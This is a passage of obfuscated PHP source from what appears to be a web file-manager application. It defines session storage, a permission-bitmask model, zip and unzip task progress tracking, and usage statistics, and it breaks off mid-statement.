SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\155\x5f\163\x65\x73\x73\151\157\156"; public function get($ë–é«¶´) { $îÅå¨ =& $_SERVER[…É¦À–]; $„ÕëŒ = $this->where(array($îÅå¨[2012] => $ë–é«¶´))->find(); if (!is_array($„ÕëŒ)) { return !1; } return $„ÕëŒ[$îÅå¨[794]]; } public function set($Ş‰Ê©®Û, $ä×üÆ–û, $Ñ‰™Û®Å = 3600) { $ÅÑéÍ… =& $_SERVER[…É¦À–]; $ÕôƒÁîĞ = array($ÅÑéÍ…[2012] => $Ş‰Ê©®Û, $ÅÑéÍ…[1916] => $ä×üÆ–û, $ÅÑéÍ…[2013] => $Ñ‰™Û®Å + time()); if (Session::get($ÅÑéÍ…[2014])) { $ÕôƒÁîĞ[$ÅÑéÍ…[1687]] = Session::get($ÅÑéÍ…[2014]); } else { $ÕôƒÁîĞ[$ÅÑéÍ…[1687]] = 0; } if ($this->get($Ş‰Ê©®Û)) { return $this->where(array($ÅÑéÍ…[2012] => $Ş‰Ê©®Û))->save($ÕôƒÁîĞ); } else { return $this->add($ÕôƒÁîĞ, array(), !0); } } public function remove($×¸·ü‰Ÿ) { return $this->where(array($_SERVER[…É¦À–][2012] => $×¸·ü‰Ÿ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[…É¦À–][2015] . time())->delete(); } } goto A÷‡ÑçÉÙ‹; f‘©‘Í‘Ô: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $§µ·Êå˜ =& $_SERVER[…É¦À–]; $›ü—ªÑ¥ = array(array($§µ·Êå˜[449] => LNG($§µ·Êå˜[1878]), $§µ·Êå˜[1879] => $§µ·Êå˜[1880], $§µ·Êå˜[1881] => 1, $§µ·Êå˜[1882] => 1, $§µ·Êå˜[1883] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($§µ·Êå˜[449] => LNG($§µ·Êå˜[1884]), $§µ·Êå˜[1879] => $§µ·Êå˜[1885], $§µ·Êå˜[1881] => 2, $§µ·Êå˜[1882] => 1, $§µ·Êå˜[1883] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($§µ·Êå˜[449] => LNG($§µ·Êå˜[1886]), $§µ·Êå˜[1879] => $§µ·Êå˜[1887], $§µ·Êå˜[1881] => 3, $§µ·Êå˜[1882] => 1, $§µ·Êå˜[1883] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($§µ·Êå˜[449] => LNG($§µ·Êå˜[1888]), $§µ·Êå˜[1879] => $§µ·Êå˜[1889], $§µ·Êå˜[1881] => 4, $§µ·Êå˜[1882] => 1, $§µ·Êå˜[1883] => self::AUTH_SHOW | self::AUTH_VIEW), array($§µ·Êå˜[449] => LNG($§µ·Êå˜[1890]), $§µ·Êå˜[1879] => $§µ·Êå˜[1891], $§µ·Êå˜[1881] => 5, $§µ·Êå˜[1882] => 1, $§µ·Êå˜[1883] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($§µ·Êå˜[449] => LNG($§µ·Êå˜[1892]), $§µ·Êå˜[1879] => $§µ·Êå˜[1893], $§µ·Êå˜[1881] => 6, $§µ·Êå˜[1882] => 1, $§µ·Êå˜[1883] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($§µ·Êå˜[449] => LNG($§µ·Êå˜[1894]), $§µ·Êå˜[1879] => $§µ·Êå˜[1895], $§µ·Êå˜[1881] => 7, $§µ·Êå˜[1882] => 1, $§µ·Êå˜[1883] => 0)); return $›ü—ªÑ¥; } public static function authCheck($—ĞïÚ®, $Ñ×Ä¥ãº) { $ø‰·ÊÆã =& $_SERVER[…É¦À–]; $—ĞïÚ® = intval($—ĞïÚ®); if ($GLOBALS[$ø‰·ÊÆã[523]] && $GLOBALS[$ø‰·ÊÆã[6]][$ø‰·ÊÆã[1896]]) { return !0; } if ($—ĞïÚ® <= 0) { return !1; } if (($—ĞïÚ® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($—ĞïÚ® & $Ñ×Ä¥ãº); } public static function authCheckShow($Ñî¶“«) { return self::authCheck($Ñî¶“«, self::AUTH_SHOW); } public static function authCheckView($ŠÑúš•ó) { return self::authCheck($ŠÑúš•ó, self::AUTH_VIEW); } public static function authCheckDownload($®ö·Ë‘ï) { return self::authCheck($®ö·Ë‘ï, self::AUTH_DOWNLOAD); } public static function authCheckUpload($·×ûÖ˜à) { return self::authCheck($·×ûÖ˜à, self::AUTH_UPLOAD); } public static function authCheckEdit($„ÈÕ£·¡) { return self::authCheck($„ÈÕ£·¡, self::AUTH_EDIT); } public static function authCheckRemove($Úø’ùóû) { return self::authCheck($Úø’ùóû, self::AUTH_REMOVE); } public static function authCheckShare($˜·ÕÆ ò) { return self::authCheck($˜·ÕÆ ò, self::AUTH_SHARE); } public static function authCheckComment($¹«ç©ˆ) { return self::authCheck($¹«ç©ˆ, self::AUTH_COMMENT); } public static function authCheckEvent($â¥—Ú®à) { return self::authCheck($â¥—Ú®à, self::AUTH_EVENT); } public static function authCheckRoot($œáÖÎŞ€) { return self::authCheck($œáÖÎŞ€, self::AUTH_ROOT); } public static function authCheckAction($ášŠ›É, $òÛşº¨) { $ˆÎÂ¾¨ =& $_SERVER[…É¦À–]; $¸Àºò = array($ˆÎÂ¾¨[1897] => self::AUTH_VIEW, $ˆÎÂ¾¨[1239] => self::AUTH_DOWNLOAD, $ˆÎÂ¾¨[107] => self::AUTH_UPLOAD, $ˆÎÂ¾¨[1847] => self::AUTH_EDIT, $ˆÎÂ¾¨[1846] => self::AUTH_REMOVE, $ˆÎÂ¾¨[1857] => self::AUTH_SHARE, $ˆÎÂ¾¨[383] => self::AUTH_COMMENT, $ˆÎÂ¾¨[1675] => self::AUTH_EVENT, $ˆÎÂ¾¨[1898] => self::AUTH_ROOT); if (!isset($¸Àºò[$òÛşº¨])) { return; } $Ğƒ›Í¥ø = $¸Àºò[$òÛşº¨]; $ášŠ›É = intval($ášŠ›É); if ($ášŠ›É <= 0) { return !1; } if (($ášŠ›É & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ášŠ›É & $Ğƒ›Í¥ø); } public static function authDisable($œşÁáà, $¡¯§³ôç) { if (intval($œşÁáà) <= 0) { return 0; } return intval($œşÁáà) & ~$¡¯§³ôç; } public $optionType = "\x53\x79\163\164\145\155\56\163\157\165\162\x63\x65\101\165\x74\x68\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\141\x75\x74\150", "\154\141\x62\x65\154", "\x64\x69\163\160\154\x61\x79", "\x73\x79\163\164\145\x6d", "\163\x6f\162\x74"); public function initData() { $å‚çÍµ = $this->authDefault(); foreach ($å‚çÍµ as $®‚Æ‰íÉ) { $this->add($®‚Æ‰íÉ); } } public function findAuth($ÊÒˆ’°, $ˆŠçä‰) { $ü½Ìˆ¨é =& $_SERVER[…É¦À–]; $şî­¡òæ = parent::listData(); foreach ($şî­¡òæ as $“Ü“àİû) { $à·­şÁ = intval($“Ü“àİû[$ü½Ìˆ¨é[442]]); if ($à·­şÁ <= 0 || $“Ü“àİû[$ü½Ìˆ¨é[1899]] == 0) { continue; } if (($à·­şÁ & $ÊÒˆ’°) != $ÊÒˆ’°) { continue; } if (($à·­şÁ & $ˆŠçä‰) != 0) { continue; } return $“Ü“àİû[$ü½Ìˆ¨é[428]]; } return !1; } public function findAuthReadOnly() { $€Ş©‘•× = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ñÂ†ŸŞ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($€Ş©‘•×, $ñÂ†ŸŞ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ó®Á‚Òñ =& $_SERVER[…É¦À–]; $¾¨ï“ƒ¹ = parent::listData(); $ã ±÷¾š = !1; foreach ($¾¨ï“ƒ¹ as $Î……ùØ) { if ($Î……ùØ[$ó®Á‚Òñ[442]] <= 0 || $Î……ùØ[$ó®Á‚Òñ[1899]] == $ó®Á‚Òñ[198]) { continue; } if (!$ã ±÷¾š) { $ã ±÷¾š = $Î……ùØ; continue; } if ($ã ±÷¾š[$ó®Á‚Òñ[442]] > $Î……ùØ[$ó®Á‚Òñ[442]]) { $ã ±÷¾š = $Î……ùØ; } } return $ã ±÷¾š ? $ã ±÷¾š[$ó®Á‚Òñ[428]] : $ó®Á‚Òñ[12]; } public function listData($Ì­ª•ìĞ = false, $ôÜá = "\163\157\162\164", $·µ—œñ¤ = false) { return parent::listData($Ì­ª•ìĞ, $ôÜá, $·µ—œñ¤); } public function update($¶Ú¯Æ¬Ü, $Ÿí¨™½) { $ë½  şñ =& $_SERVER[…É¦À–]; $²şÕ£Øê = parent::listData($¶Ú¯Æ¬Ü); $’÷‡¯×® = $this->findByName($Ÿí¨™½[$ë½  şñ[32]]); if (!$²şÕ£Øê || $’÷‡¯×® && $’÷‡¯×®[$ë½  şñ[428]] != $²şÕ£Øê[$ë½  şñ[428]]) { return !1; } $this->filterAuth($Ÿí¨™½[$ë½  şñ[442]]); return parent::update($¶Ú¯Æ¬Ü, $Ÿí¨™½); } public function remove($İ ·ì) { $å¿¨°ô‘ = parent::listData($İ ·ì); if (!$å¿¨°ô‘ || $å¿¨°ô‘[$_SERVER[…É¦À–][1332]]) { return !1; } return parent::remove($İ ·ì); } public function add($ùÄ•„” = array()) { $ÌÖú¿­é =& $_SERVER[…É¦À–]; if ($this->findByName($ùÄ•„”[$ÌÖú¿­é[32]])) { return !1; } $É êùûƒ = array($ÌÖú¿­é[32] => $ÌÖú¿­é[12], $ÌÖú¿­é[442] => 1, $ÌÖú¿­é[1900] => $ÌÖú¿­é[1887], $ÌÖú¿­é[1899] => 1, $ÌÖú¿­é[1332] => 0, $ÌÖú¿­é[1901] => 0); $ùÄ•„” = array_merge($É êùûƒ, $ùÄ•„”); $ùÄ•„”[$ÌÖú¿­é[1901]] = $this->getSort(); $this->filterAuth($ùÄ•„”[$ÌÖú¿­é[442]]); return parent::insert($ùÄ•„”); } private function getSort() { $®Ì¸Ê×¦ =& $_SERVER[…É¦À–]; $­«Ş›ÓÑ = parent::listData(); $©úø“¿ = array_to_keyvalue($­«Ş›ÓÑ, $®Ì¸Ê×¦[12], $®Ì¸Ê×¦[1901]); return empty($©úø“¿) ? 0 : max($©úø“¿) + 1; } private function filterAuth(&$÷ï¼â”Ö) { if (!$÷ï¼â”Ö) { return; } $‚áüÌÂÆ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ĞàÚœ£ = array(); foreach ($‚áüÌÂÆ as $áø™ÀÓ) { if ($÷ï¼â”Ö & $áø™ÀÓ) { $ĞàÚœ£[] = $áø™ÀÓ; } } if (in_array(self::AUTH_ROOT, $ĞàÚœ£)) { $÷ï¼â”Ö = array_sum($‚áüÌÂÆ); return; } $¿°¡Şüå = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ĞàÚœ£ as $áø™ÀÓ) { if (isset($¿°¡Şüå[$áø™ÀÓ])) { $ĞàÚœ£ = array_merge($ĞàÚœ£, $¿°¡Şüå[$áø™ÀÓ]); } } $ĞàÚœ£[] = self::AUTH_SHOW; $÷ï¼â”Ö = array_sum(array_unique($ĞàÚœ£)); } public function sort($Æ®ç™¬¡, $íºó×¿ò) { return parent::update($Æ®ç™¬¡, $íºó×¿ò); } } $_file = $_SERVER[$_SERVER[…É¦À–][1613]]; $_size = $_SERVER[…É¦À–][918]; goto BÌõÉ—ÕİÂ; AÔÇ™¹ÒĞ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $©ÚÍ»Ÿ” =& $_SERVER[…É¦À–]; parent::startAfter(); Hook::bind($©ÚÍ»Ÿ”[1798], array($this, $©ÚÍ»Ÿ”[1799])); Hook::bind($©ÚÍ»Ÿ”[1238], array($this, $©ÚÍ»Ÿ”[1800])); $çëÊóÄé =& $this->task; $çëÊóÄé[$©ÚÍ»Ÿ”[1801]] = $©ÚÍ»Ÿ”[1239]; if (!$çëÊóÄé[$©ÚÍ»Ÿ”[1584]]) { $çëÊóÄé[$©ÚÍ»Ÿ”[1584]] = LNG($©ÚÍ»Ÿ”[1802]); } } protected function endAfter() { $ ÇÃ´Õà =& $_SERVER[…É¦À–]; parent::endAfter(); Hook::unbind($ ÇÃ´Õà[1798], array($this, $ ÇÃ´Õà[1799])); Hook::unbind($ ÇÃ´Õà[1238], array($this, $ ÇÃ´Õà[1800])); } public function updateAfter() { $–¤´†û­ =& $_SERVER[…É¦À–]; $Üşñ”— =& $this->task; if (!$Üşñ”—[$–¤´†û­[826]] || !$Üşñ”—[$–¤´†û­[803]]) { return; } if ($Üşñ”—[$–¤´†û­[1801]] == $–¤´†û­[1239]) { $é§š’ß = 0; if ($Üşñ”—[$–¤´†û­[1740]]) { $é§š’ß = $Üşñ”—[$–¤´†û­[1741]] / $Üşñ”—[$–¤´†û­[1740]]; } $Üşñ”—[$–¤´†û­[1689]] = $é§š’ß * 0.3; } else { if ($Üşñ”—[$–¤´†û­[1801]] == $–¤´†û­[342]) { $é§š’ß = $Üşñ”—[$–¤´†û­[1688]] / $Üşñ”—[$–¤´†û­[826]]; $Üşñ”—[$–¤´†û­[1689]] = 0.3 + $é§š’ß * 0.4; } else { if ($Üşñ”—[$–¤´†û­[1801]] == $–¤´†û­[107]) { $üÂ¸Œİ = 0; if ($Üşñ”—[$–¤´†û­[1742]] == $–¤´†û­[107]) { $üÂ¸Œİ = $Üşñ”—[$–¤´†û­[1741]]; } $é§š’ß = ($Üşñ”—[$–¤´†û­[1745]] + $üÂ¸Œİ) / $Üşñ”—[$–¤´†û­[803]]; $Üşñ”—[$–¤´†û­[1689]] = 0.3 + 0.4 + $é§š’ß * 0.3; } } } if ($Üşñ”—[$–¤´†û­[1689]] > 0) { $¶ˆú·èº = timeFloat() - $Üşñ”—[$–¤´†û­[1691]] - $Üşñ”—[$–¤´†û­[1694]]; $Üşñ”—[$–¤´†û­[1695]] = $¶ˆú·èº * (1 - $Üşñ”—[$–¤´†û­[1689]]) / $Üşñ”—[$–¤´†û­[1689]]; } } public function addFile($‰Ñ›ñéù) { $›¥Â¼« =& $_SERVER[…É¦À–]; $¨ºâ¤›· =& $this->task; $¤„ÌÅï† = IO::info($‰Ñ›ñéù); $¨ºâ¤›·[$›¥Â¼«[1738]] = $¤„ÌÅï†[$›¥Â¼«[32]]; $¨ºâ¤›·[$›¥Â¼«[1740]] = $¤„ÌÅï†[$›¥Â¼«[76]]; $¨ºâ¤›·[$›¥Â¼«[1741]] = 0; $¨ºâ¤›·[$›¥Â¼«[1109]] = $›¥Â¼«[1761]; $¨ºâ¤›·[$›¥Â¼«[1742]] = $›¥Â¼«[1239]; $¨ºâ¤›·[$›¥Â¼«[803]] = $¤„ÌÅï†[$›¥Â¼«[76]]; $¨ºâ¤›·[$›¥Â¼«[826]] = 1; $¬íÁÆ±À = 0; $¨ºâ¤›·[$›¥Â¼«[1749]] = array($›¥Â¼«[1750] => $¬íÁÆ±À + 1, $›¥Â¼«[449] => $¤„ÌÅï†[$›¥Â¼«[32]], $›¥Â¼«[84] => $¤„ÌÅï†[$›¥Â¼«[84]], $›¥Â¼«[538] => $¤„ÌÅï†[$›¥Â¼«[538]] ? $¤„ÌÅï†[$›¥Â¼«[538]] : $¤„ÌÅï†[$›¥Â¼«[84]]); $this->update(); } public function unzipAfter($ºüîçŞ•) { $şÍ©ƒ =& $_SERVER[…É¦À–]; $³¦‡Á·º =& $this->task; $³¦‡Á·º[$şÍ©ƒ[1801]] = $şÍ©ƒ[107]; $ú‡¢  = IO::infoWithChildren($ºüîçŞ•); $ê©İ…óÖ = 0; $³¦‡Á·º[$şÍ©ƒ[1749]] = array($şÍ©ƒ[1750] => $ê©İ…óÖ + 1, $şÍ©ƒ[449] => $ú‡¢ [$şÍ©ƒ[32]], $şÍ©ƒ[84] => $ú‡¢ [$şÍ©ƒ[84]], $şÍ©ƒ[538] => $ú‡¢ [$şÍ©ƒ[538]] ? $ú‡¢ [$şÍ©ƒ[538]] : $ú‡¢ [$şÍ©ƒ[84]]); if ($ú‡¢ [$şÍ©ƒ[33]] == $şÍ©ƒ[200]) { $³¦‡Á·º[$şÍ©ƒ[826]] = 1; } else { $³¦‡Á·º[$şÍ©ƒ[826]] = $ú‡¢ [$şÍ©ƒ[79]][$şÍ©ƒ[77]]; } $³¦‡Á·º[$şÍ©ƒ[1109]] = $şÍ©ƒ[12]; $³¦‡Á·º[$şÍ©ƒ[1742]] = 0; $³¦‡Á·º[$şÍ©ƒ[1688]] = 0; $³¦‡Á·º[$şÍ©ƒ[1740]] = 0; $³¦‡Á·º[$şÍ©ƒ[1741]] = 0; $³¦‡Á·º[$şÍ©ƒ[1738]] = $şÍ©ƒ[12]; $³¦‡Á·º[$şÍ©ƒ[1745]] = 0; $³¦‡Á·º[$şÍ©ƒ[803]] = $ú‡¢ [$şÍ©ƒ[76]]; $this->update(); self::log($şÍ©ƒ[1803] . json_encode(array($³¦‡Á·º, $ú‡¢ ))); } public function nameParse($“Ü²ùá) { $œóè…âÔ =& $_SERVER[…É¦À–]; $’û‹Ş´ =& $this->task; if ($’û‹Ş´[$œóè…âÔ[1801]] == $œóè…âÔ[1239]) { $’û‹Ş´[$œóè…âÔ[1801]] = $œóè…âÔ[342]; $’û‹Ş´[$œóè…âÔ[1745]] = 0; $’û‹Ş´[$œóè…âÔ[803]] = 0; } $ÈÁÖĞ£ = get_path_this($“Ü²ùá); if (strstr($ÈÁÖĞ£, $œóè…âÔ[10])) { $’û‹Ş´[$œóè…âÔ[1688]] += 1; $’û‹Ş´[$œóè…âÔ[826]] += 1; } $’û‹Ş´[$œóè…âÔ[1738]] = $“Ü²ùá; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÓÜÀğ„¢ =& $_SERVER[…É¦À–]; parent::startAfter(); Hook::bind($ÓÜÀğ„¢[1804], array($this, $ÓÜÀğ„¢[1799])); $”‚†õÕ¤ =& $this->task; $”‚†õÕ¤[$ÓÜÀğ„¢[1801]] = $ÓÜÀğ„¢[1239]; if (!$”‚†õÕ¤[$ÓÜÀğ„¢[1584]]) { $”‚†õÕ¤[$ÓÜÀğ„¢[1584]] = LNG($ÓÜÀğ„¢[1805]); } } protected function endAfter() { $ëÔâ¼Ã” =& $_SERVER[…É¦À–]; parent::endAfter(); Hook::unbind($ëÔâ¼Ã”[1804], array($this, $ëÔâ¼Ã”[1799])); } public function updateAfter() { $ú¡ŸÎ› =& $_SERVER[…É¦À–]; $¼òáÀÇ =& $this->task; if (!$¼òáÀÇ[$ú¡ŸÎ›[826]] || !$¼òáÀÇ[$ú¡ŸÎ›[803]]) { return; } if ($¼òáÀÇ[$ú¡ŸÎ›[1801]] == $ú¡ŸÎ›[1239]) { $°î°ú—É = $¼òáÀÇ[$ú¡ŸÎ›[1741]]; if ($¼òáÀÇ[$ú¡ŸÎ›[1742]] != $ú¡ŸÎ›[1239]) { $°î°ú—É = 0; } $º–­ ”Ù = ($¼òáÀÇ[$ú¡ŸÎ›[1745]] + $°î°ú—É) / $¼òáÀÇ[$ú¡ŸÎ›[803]]; $¼òáÀÇ[$ú¡ŸÎ›[1689]] = $º–­ ”Ù * 0.3; } else { if ($¼òáÀÇ[$ú¡ŸÎ›[1801]] == $ú¡ŸÎ›[342]) { $º–­ ”Ù = $¼òáÀÇ[$ú¡ŸÎ›[1688]] / $¼òáÀÇ[$ú¡ŸÎ›[826]]; $¼òáÀÇ[$ú¡ŸÎ›[1689]] = 0.3 + $º–­ ”Ù * 0.5; } else { if ($¼òáÀÇ[$ú¡ŸÎ›[1801]] == $ú¡ŸÎ›[107]) { $º–­ ”Ù = 0; if ($¼òáÀÇ[$ú¡ŸÎ›[1740]]) { $º–­ ”Ù = $¼òáÀÇ[$ú¡ŸÎ›[1741]] / $¼òáÀÇ[$ú¡ŸÎ›[1740]]; } $¼òáÀÇ[$ú¡ŸÎ›[1689]] = 0.3 + 0.5 + $º–­ ”Ù * 0.2; } } } if ($¼òáÀÇ[$ú¡ŸÎ›[1689]] > 0) { $©ÒğÆ™ = timeFloat() - $¼òáÀÇ[$ú¡ŸÎ›[1691]] - $¼òáÀÇ[$ú¡ŸÎ›[1694]]; $¼òáÀÇ[$ú¡ŸÎ›[1695]] = $©ÒğÆ™ * (1 - $¼òáÀÇ[$ú¡ŸÎ›[1689]]) / $¼òáÀÇ[$ú¡ŸÎ›[1689]]; } } public function copyFileStart($ ¶ª¥ìğ, $ı©½Ë¡¶, $˜×—‚½‘, $­İº˜¼µ, $­­¡ÉŞ, $Åù´ãÁ) { $Îæ”Çà =& $_SERVER[…É¦À–]; parent::copyFileStart($ ¶ª¥ìğ, $ı©½Ë¡¶, $˜×—‚½‘, $­İº˜¼µ, $­­¡ÉŞ, $Åù´ãÁ); $³ã•ù‘Ù =& $this->task; if ($³ã•ù‘Ù[$Îæ”Çà[1801]] == $Îæ”Çà[342]) { $³ã•ù‘Ù[$Îæ”Çà[1801]] = $Îæ”Çà[107]; } $this->update(); } public function copyFileEnd($·ØŒÀÍÚ, $ÎÑØ, $šÙéˆ²¥, $½¥ôŠò, $¸ÖÕ™ö‰, $ã³ò«‰) { $£˜÷¯á =& $_SERVER[…É¦À–]; $ÚØËŞŠ =& $this->task; $ÚØËŞŠ[$£˜÷¯á[1741]] = $ÚØËŞŠ[$£˜÷¯á[1740]]; $ÚØËŞŠ[$£˜÷¯á[1745]] += $ÚØËŞŠ[$£˜÷¯á[1740]]; $ÚØËŞŠ[$£˜÷¯á[1742]] = $£˜÷¯á[12]; $this->update(); } public function nameParse($ßÊ¸Ö˜˜) { $–€¤—¡ =& $_SERVER[…É¦À–]; $ã…Ç·¥ =& $this->task; if ($ã…Ç·¥[$–€¤—¡[1688]] < $ã…Ç·¥[$–€¤—¡[826]]) { $ë»¨´¡Ñ = get_path_this($ßÊ¸Ö˜˜); if (strstr($ë»¨´¡Ñ, $–€¤—¡[10])) { $ã…Ç·¥[$–€¤—¡[1688]] += 1; } } if ($ã…Ç·¥[$–€¤—¡[1801]] == $–€¤—¡[1239]) { $ã…Ç·¥[$–€¤—¡[1801]] = $–€¤—¡[342]; } $ã…Ç·¥[$–€¤—¡[1738]] = $ßÊ¸Ö˜˜; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ñª­¨›æ) { $»­¥“„ú =& $_SERVER[…É¦À–]; $ä¢Ü•§ = array($»­¥“„ú[619] => array($»­¥“„ú[33] => $»­¥“„ú[1806], $»­¥“„ú[302] => array($»­¥“„ú[224], $»­¥“„ú[805], $»­¥“„ú[1807], $»­¥“„ú[1808])), $»­¥“„ú[1809] => array($»­¥“„ú[33] => $»­¥“„ú[1810], $»­¥“„ú[302] => array($»­¥“„ú[224], $»­¥“„ú[803], $»­¥“„ú[1811], $»­¥“„ú[1812], $»­¥“„ú[1813]))); if (!isset($ä¢Ü•§[$ñª­¨›æ])) { return !1; } $this->optionType = $ä¢Ü•§[$ñª­¨›æ][$»­¥“„ú[33]]; $this->field = $ä¢Ü•§[$ñª­¨›æ][$»­¥“„ú[302]]; return !0; } public function listData($ğÆÀ‡Ëı = false, $‡¡§ö‹ = "\x6d\x6f\x64\x69\x66\x79\x54\151\155\145", $”Óü›ë† = false) { return parent::listData($ğÆÀ‡Ëı, $‡¡§ö‹, $”Óü›ë†); } public function trendList($”îåè„) { $İåš˜Ûå =& $_SERVER[…É¦À–]; $Æ€ğœ½ = $this->listData(); if ($Æ€ğœ½) { $ñä¹öœ = end($Æ€ğœ½); $Ã™¡Ÿğú = date($İåš˜Ûå[1814], strtotime($İåš˜Ûå[1815])); if ($ñä¹öœ[$İåš˜Ûå[224]] == $Ã™¡Ÿğú) { return $Æ€ğœ½; } $¿Œ÷¿Õø = strtotime($ñä¹öœ[$İåš˜Ûå[224]]); } if (!isset($¿Œ÷¿Õø)) { $—¾í÷ı = $”îåè„ == $İåš˜Ûå[619] ? $İåš˜Ûå[554] : $İåš˜Ûå[865]; $¿Œ÷¿Õø = Model($—¾í÷ı)->min($İåš˜Ûå[201]); } $ˆ´êëà° = $İåš˜Ûå[1816] . ucfirst($”îåè„); $ñ°ğ‰­¦ = $this->dateList($¿Œ÷¿Õø); foreach ($ñ°ğ‰­¦ as $Ã™¡Ÿğú) { $this->{$ˆ´êëà°}($Ã™¡Ÿğú); } return $this->listData(); } private function dateList($¸Ó®³ØŸ) { $å£ç—£« =& $_SERVER[…É¦À–]; $ß»†Õ¿¡ = $¸Ó®³ØŸ; $êÚ§ã¶ò = strtotime($å£ç—£«[1815]); $€ã˜”ÙÍ = array(); while ($ß»†Õ¿¡ <= $êÚ§ã¶ò) { $€ã˜”ÙÍ[] = date($å£ç—£«[1814], $ß»†Õ¿¡); $ß»†Õ¿¡ = strtotime($å£ç—£«[1817], $ß»†Õ¿¡); } return $€ã˜”ÙÍ; } public function _recordUser($ŠÃ›ñÛ = '') { $„­°ÅÄš =& $_SERVER[…É¦À–]; $À¯™Õ§œ = strtotime(date($„­°ÅÄš[1818], strtotime($ŠÃ›ñÛ))); $èÎÚ­âø = strtotime(date($„­°ÅÄš[1819], strtotime($ŠÃ›ñÛ))); $¡Œóó‹¶ = array($„­°ÅÄš[201] => array($„­°ÅÄš[1058], $èÎÚ­âø)); $…Ñ°ó¦ = Model($„­°ÅÄš[554])->where($¡Œóó‹¶)->count($„­°ÅÄš[1687]); $¡Œóó‹¶[$„­°ÅÄš[201]] = array($„­°ÅÄš[362], array($À¯™Õ§œ, $èÎÚ­âø)); $ó˜öÑİ™ = Model($„­°ÅÄš[554])->where($¡Œóó‹¶)->count($„­°ÅÄš[1687]); $¡Œóó‹¶[$„­°ÅÄš[33]] = $„­°ÅÄš[1820]; $˜Ëëœó = Model($„­°ÅÄš[1821])->where($¡Œóó‹¶)->count($„­°ÅÄš[1822]); $ÔÀØÉô = array($„­°ÅÄš[224] => $ŠÃ›ñÛ, $„­°ÅÄš[805] => (int) $…Ñ°ó¦, $„­°ÅÄš[1807] => (int) $ó˜öÑİ™, $„­°ÅÄš[1808] => (int) $˜Ëëœó); return $this->insert($ÔÀØÉô); } public function _recordStore($—¥÷Îè = '') { $¯²ÑíÍÇ =& $_SERVER[…É¦À–]; $õ“ä–ÎÛ = strtotime(date($¯²ÑíÍÇ[1819], strtotime($—¥÷Îè))); $²ˆ¦«¶Ÿ = array($¯²ÑíÍÇ[201] => array($¯²ÑíÍÇ[1058], $õ“ä–ÎÛ)); $ÁùÃÜĞå = Model($¯²ÑíÍÇ[500])->where($²ˆ¦«¶Ÿ)->sum($¯²ÑíÍÇ[76]); $²ˆ¦«¶Ÿ[$¯²ÑíÍÇ[439]] = 0; $µÌÕ½× = Model($¯²ÑíÍÇ[865])->where($²ˆ¦«¶Ÿ)->sum($¯²ÑíÍÇ[76]); $²ˆ¦«¶Ÿ[$¯²ÑíÍÇ[440]] = 1; $›şÓ§›ö = Model($¯²ÑíÍÇ[865])->where($²ˆ¦«¶Ÿ)->sum($¯²ÑíÍÇ[76]); $²ˆ¦«¶Ÿ[$¯²ÑíÍÇ[440]] = 2; $ÉÉŸÏ­ = Model($¯²ÑíÍÇ[865])->where($²ˆ¦«¶Ÿ)->sum($¯²ÑíÍÇ[76]); $—æê‘ÍÚ = array($¯²ÑíÍÇ[224] => $—¥÷Îè, $¯²ÑíÍÇ[803] => (int) $µÌÕ½×, $¯²ÑíÍÇ[1811] => (int) $ÁùÃÜĞå, $¯²ÑíÍÇ[1812] => (int) $›şÓ§›ö, $¯²ÑíÍÇ[1813] => (int) $ÉÉŸÏ­); return $this->insert($—æê‘ÍÚ); } public function trend($Ïøœ©¡©, $È…É¶ªÌ) { $Ö¶‚í² =& $_SERVER[…É¦À–]; if (!$this->init($Ïøœ©¡©)) { return !1; } $”ìÆï“È = $this->trendList($Ïøœ©¡©); if ($”ìÆï“È && $È…É¶ªÌ != $Ö¶‚í²[1660]) { $êĞ›Æš£ = $”ìÆï“È[0][$Ö¶‚í²[224]]; $ŸÖÒÁëø = $this->validDate($È…É¶ªÌ, $êĞ›Æš£); $öæÆ×í = array(); $»µæ¢ª = 